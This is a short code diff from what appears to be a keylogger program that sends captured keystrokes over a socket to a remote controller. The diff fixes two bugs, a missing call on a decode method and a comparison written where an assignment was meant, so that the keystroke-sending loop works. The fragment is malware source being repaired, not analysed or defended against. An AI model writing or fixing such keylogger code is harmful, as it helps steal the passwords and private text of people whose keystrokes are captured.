@@ -69,8 +69,8 @@ while msg != 'quit':
             t1.join()
             client_socket.send(allkeys.encode())
             allkeys = ''
-            msg = client_socket.recv(1024).decode
-            keylogging_mode == 0
+            msg = client_socket.recv(1024).decode()
+            keylogging_mode = 0
 
         elif keylogging_mode==0:
             msg = "Keyloggin should be started first"
